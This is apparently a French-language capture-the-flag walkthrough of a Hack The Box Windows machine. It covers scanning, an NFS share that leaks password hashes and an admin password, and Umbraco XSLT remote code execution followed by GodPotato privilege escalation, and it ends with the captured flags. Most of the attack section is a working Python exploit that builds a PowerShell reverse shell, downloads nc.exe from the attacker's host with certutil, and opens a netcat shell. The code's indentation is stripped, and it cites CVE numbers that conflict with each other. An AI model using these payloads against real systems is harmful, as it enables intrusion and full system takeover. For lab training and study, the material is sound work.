
# Target : 10.129.230.172

# Enumeration des ports et services

```js
nmap -sV -sC 10.129.230.172 -O
```


```js
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-28 08:29 +0000
Nmap scan report for 10.129.230.172
Host is up (0.14s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Home - Acme Widgets
111/tcp  open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|   100005  1,2,3       2049/udp6  mountd
|   100021  1,2,3,4     2049/tcp   nlockmgr
|   100021  1,2,3,4     2049/tcp6  nlockmgr
|   100021  1,2,3,4     2049/udp   nlockmgr
|   100021  1,2,3,4     2049/udp6  nlockmgr
|   100024  1           2049/tcp   status
|   100024  1           2049/tcp6  status
|   100024  1           2049/udp   status
|_  100024  1           2049/udp6  status
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
2049/tcp open  nlockmgr      1-4 (RPC #100021)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.99%E=4%D=7/28%OT=21%CT=1%CU=42054%PV=Y%DS=2%DC=I%G=Y%TM=6A68690
OS:0%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS=S%TS=
OS:U)SEQ(SP=104%GCD=1%ISR=107%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=106%GCD=1%ISR
OS:=109%TI=I%CI=I%II=I%SS=S%TS=U)SEQ(SP=106%GCD=1%ISR=10B%TI=I%CI=I%II=I%SS
OS:=S%TS=U)SEQ(SP=106%GCD=1%ISR=10D%TI=I%CI=I%II=I%SS=S%TS=U)OPS(O1=M552NW8
OS:NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS)WIN(
OS:W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF
OS:%O=M552NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R
OS:=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%
OS:A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)
OS:U1(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)I
OS:E(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-07-28T09:31:24
|_  start_date: N/A
|_clock-skew: 1h00m01s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 141.66 seconds
```

## Enumeration FTP

```js
|_ftp-anon: Anonymous FTP login allowed
```

Dans le scan nmap nous pouvons appercevoir que la connexion anonyme est autoriser

```js
ftp 10.129.230.172
```

```js
Connected to 10.129.230.172.
220 Microsoft FTP Service
Name (10.129.230.172:amogus): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls -la
229 Entering Extended Passive Mode (|||49688|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> dir 
229 Entering Extended Passive Mode (|||49689|)
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> pwd
Remote directory: /
ftp> dir -Hidden
229 Entering Extended Passive Mode (|||49690|)
150 Opening ASCII mode data connection.
226 Transfer complete.
ftp> 
```

Partage FTP vide

## Enumeration nlockmgr

`*Nlockmgr* (Network Lock Manager) est un service réseau qui gère le verrouillage des fichiers pour le protocole [Network File System](NFS). Il empêche que deux utilisateurs ou programmes modifient le même fichier en même temps sur un réseau`


### Connection au partage NFS

```js
sudo mount -t nfs 10.129.230.172:/ ./target-NFS/ -o nolock
```

![[Pasted image 20260728084826.png]]

### Found

```js
Administratoradmindefaulten-US
Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
smithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749-a054-27463ae58b8e
ssmithsmith@htb.localjxDUCcruzN8rSRlqnfmvqw==AIKYyl6Fyy29KA3htB/ERiyJUAdpTtFeTpnIk9CiHts={"hashAlgorithm":"HMACSHA256"}smith@htb.localen-US7e39df83-5e64-4b93-9702-ae257a9b9749
ssmithssmith@htb.local8+xXICbPe7m5NQ22HfcGlg==RF9OLinww9rd2PmaKUpLteR6vesD2MtFaBKe1zL5SXA={"hashAlgorithm":"HMACSHA256"}ssmith@htb.localen-US3628acfb-a62c-4ab0-93f7-5ee9724c8d32
```

### Creds

```js
User: admin@htb.local | pass: baconandcheese
```
## Enumeration http

```js
http://10.129.230.172
```

### Enumeration des repertoires

```js
gobuster dir --url "http://10.129.230.172" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

![[Pasted image 20260728103020.png]]

## Connection a la page admin avec les creds trouvees

![[Pasted image 20260728105230.png]]


Apres quelque recherche sur ce net j'ai pu appercevoir que la version de ce cms est vuln a *CVE-2017-15280*

### PoC
```url
github.com/noraj/Umbraco-RCE/
```

`L'exploit EDB-ID 46153 détaille une exécution de code à distance (RCE) authentifiée dans Umbraco v7.7.4 (CVE-2019-25137), résultant de l'absence de sandboxing dans le moteur de transformation XSLT. Des administrateurs peuvent détourner la fonctionnalité `xsltVisualize.aspx` en injectant des blocs `<msxsl:script>` contenant du code C# malveillant, compilé et exécuté côté serveur par le framework .NET.`

![[Pasted image 20260728115009.png]]
## Reverse Shell

Avec le payload je n'arrivais pas a obtenir un shell j'ai du le personnaliser 

```js
import requests

from bs4 import BeautifulSoup

import sys

import base64

import time

  

def print_dict(dico):

print(dico.items())

  

def generate_reverse_shell_payload(ip, port):

"""

Génère un payload XSLT pour un reverse shell

"""

# Option 1: Reverse shell PowerShell (recommandé)

ps_shell = f'''$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});

$stream = $client.GetStream();

[byte[]]$bytes = 0..65535|%{{0}};

while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{

$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);

$sendback = (iex $data 2>&1 | Out-String );

$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';

$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);

$stream.Write($sendbyte,0,$sendbyte.Length);

$stream.Flush()

}};

$client.Close()'''

# Encoder en base64

ps_encoded = base64.b64encode(ps_shell.encode('utf-16le')).decode()

# Payload XSLT avec PowerShell

payload = f'''<?xml version="1.0"?>

<xsl:stylesheet version="1.0"

xmlns:xsl="http://www.w3.org/1999/XSL/Transform"

xmlns:msxsl="urn:schemas-microsoft-com:xslt"

xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">

<msxsl:script language="C#" implements-prefix="csharp_user">

public string xml()

{{

string cmd = "";

System.Diagnostics.Process proc = new System.Diagnostics.Process();

proc.StartInfo.FileName = "powershell.exe";

proc.StartInfo.Arguments = "-e {ps_encoded}";

proc.StartInfo.UseShellExecute = false;

proc.StartInfo.RedirectStandardOutput = true;

proc.Start();

string output = proc.StandardOutput.ReadToEnd();

return output;

}}

</msxsl:script>

<xsl:template match="/">

<xsl:value-of select="csharp_user:xml()"/>

</xsl:template>

</xsl:stylesheet>'''

return payload

  

def generate_cmd_shell_payload(command):

"""

Génère un payload XSLT pour exécuter une commande système

"""

payload = f'''<?xml version="1.0"?>

<xsl:stylesheet version="1.0"

xmlns:xsl="http://www.w3.org/1999/XSL/Transform"

xmlns:msxsl="urn:schemas-microsoft-com:xslt"

xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">

<msxsl:script language="C#" implements-prefix="csharp_user">

public string xml()

{{

string cmd = "";

System.Diagnostics.Process proc = new System.Diagnostics.Process();

proc.StartInfo.FileName = "cmd.exe";

proc.StartInfo.Arguments = "/c {command}";

proc.StartInfo.UseShellExecute = false;

proc.StartInfo.RedirectStandardOutput = true;

proc.Start();

string output = proc.StandardOutput.ReadToEnd();

return output;

}}

</msxsl:script>

<xsl:template match="/">

<xsl:value-of select="csharp_user:xml()"/>

</xsl:template>

</xsl:stylesheet>'''

return payload

  

def generate_upload_payload(local_ip, remote_path):

"""

Payload pour télécharger nc.exe

"""

payload = f'''<?xml version="1.0"?>

<xsl:stylesheet version="1.0"

xmlns:xsl="http://www.w3.org/1999/XSL/Transform"

xmlns:msxsl="urn:schemas-microsoft-com:xslt"

xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">

<msxsl:script language="C#" implements-prefix="csharp_user">

public string xml()

{{

string cmd = "";

System.Diagnostics.Process proc = new System.Diagnostics.Process();

proc.StartInfo.FileName = "cmd.exe";

proc.StartInfo.Arguments = "/c certutil -urlcache -f http://{local_ip}/nc.exe C:\\\\Windows\\\\Temp\\\\nc.exe";

proc.StartInfo.UseShellExecute = false;

proc.StartInfo.RedirectStandardOutput = true;

proc.Start();

string output = proc.StandardOutput.ReadToEnd();

return output;

}}

</msxsl:script>

<xsl:template match="/">

<xsl:value-of select="csharp_user:xml()"/>

</xsl:template>

</xsl:stylesheet>'''

return payload

  

def exploit(host, login, password, payload_type, **kwargs):

print("[+] Début de l'exploit")

# Step 1 - Get Main page

s = requests.session()

url_main = host + "/umbraco/"

r1 = s.get(url_main)

print("[+] Cookies récupérés")

# Step 2 - Process Login

url_login = host + "/umbraco/backoffice/UmbracoApi/Authentication/PostLogin"

loginfo = {"username": login, "password": password}

r2 = s.post(url_login, json=loginfo)

if r2.status_code != 200:

print(f"[-] Échec de connexion: {r2.status_code}")

return False

print("[+] Connexion réussie")

# Step 3 - Go to vulnerable web page

url_xslt = host + "/umbraco/developer/Xslt/xsltVisualize.aspx"

r3 = s.get(url_xslt)

soup = BeautifulSoup(r3.text, 'html.parser')

VIEWSTATE = soup.find(id="__VIEWSTATE")['value']

VIEWSTATEGENERATOR = soup.find(id="__VIEWSTATEGENERATOR")['value']

UMBXSRFTOKEN = s.cookies['UMB-XSRF-TOKEN']

# Générer le payload selon le type

if payload_type == "reverse_shell":

payload = generate_reverse_shell_payload(kwargs['ip'], kwargs['port'])

print(f"[+] Reverse shell vers {kwargs['ip']}:{kwargs['port']}")

elif payload_type == "cmd":

payload = generate_cmd_shell_payload(kwargs['command'])

print(f"[+] Exécution de: {kwargs['command']}")

elif payload_type == "upload":

payload = generate_upload_payload(kwargs['local_ip'])

print(f"[+] Téléchargement de nc.exe depuis {kwargs['local_ip']}")

else:

print("[-] Type de payload inconnu")

return False

# Step 4 - Launch the attack

headers = {'UMB-XSRF-TOKEN': UMBXSRFTOKEN}

data = {

"__EVENTTARGET": "",

"__EVENTARGUMENT": "",

"__VIEWSTATE": VIEWSTATE,

"__VIEWSTATEGENERATOR": VIEWSTATEGENERATOR,

"ctl00$body$xsltSelection": payload,

"ctl00$body$contentPicker$ContentIdValue": "",

"ctl00$body$visualizeDo": "Visualize+XSLT"

}

print("[+] Envoi du payload...")

r4 = s.post(url_xslt, data=data, headers=headers)

if r4.status_code == 200:

print("[+] Payload envoyé avec succès")

if payload_type == "cmd" or payload_type == "upload":

# Afficher la sortie de la commande

print("[+] Résultat:")

print(r4.text)

return True

else:

print(f"[-] Erreur: {r4.status_code}")

return False

  

def main():

host = "http://10.129.230.172"

login = "admin@htb.local"

password = "baconandcheese"

print("="*50)

print("UMBRACO RCE EXPLOIT - REVERSE SHELL")

print("="*50)

print("\n[1] Reverse Shell PowerShell")

print("[2] Exécuter une commande système")

print("[3] Uploader nc.exe")

print("[4] Reverse shell avec nc.exe")

choice = input("\nChoisissez une option (1-4): ")

if choice == "1":

ip = input("Votre IP pour le listener: ")

port = input("Port pour le listener (par défaut 4444): ") or "4444"

exploit(host, login, password, "reverse_shell", ip=ip, port=port)

print(f"\n[!] Assurez-vous d'avoir un listener: nc -lvnp {port}")

elif choice == "2":

cmd = input("Commande à exécuter (ex: whoami): ")

exploit(host, login, password, "cmd", command=cmd)

elif choice == "3":

local_ip = input("Votre IP pour le serveur HTTP: ")

print(f"[!] Assurez-vous d'avoir un serveur HTTP: python3 -m http.server 80")

input("Appuyez sur Entrée quand le serveur est prêt...")

exploit(host, login, password, "upload", local_ip=local_ip)

elif choice == "4":

ip = input("Votre IP pour le listener: ")

port = input("Port pour le listener (par défaut 4444): ") or "4444"

print(f"[!] Assurez-vous d'avoir un listener: nc -lvnp {port}")

exploit(host, login, password, "cmd", command=f"C:\\Windows\\Temp\\nc.exe -e cmd.exe {ip} {port}")

else:

print("Option invalide")

  

if __name__ == "__main__":

main()
```

![[Pasted image 20260728135520.png]]

![[Pasted image 20260728135541.png]]


# User.txt : 65b9a5426958a6ba97e66758b0539e67


## Privilege Esclation

avec le `whoami /priv` je remarque que j'ai des droit d'impersonnation, alors je vais utiliser GodPoato pour avoir un potentiel elevation de privilege

```js
PS C:\windows\system32\inetsrv> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAuditPrivilege              Generate security audits                  Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
PS C:\windows\system32\inetsrv> dir

```


GodPotato : https://github.com/BeichenDream/GodPotato/releases?source=post_page-----400b88403a71---------------------------------------

![[Pasted image 20260728135822.png]]


Obtention de shell via penelope pour passer nt authority system

```js
penelope
```

![[Pasted image 20260728135946.png]]


# Root.txt : aa8b3c8d0168ee075bf22bf1c9e5d32f

![[Pasted image 20260728140313.png]]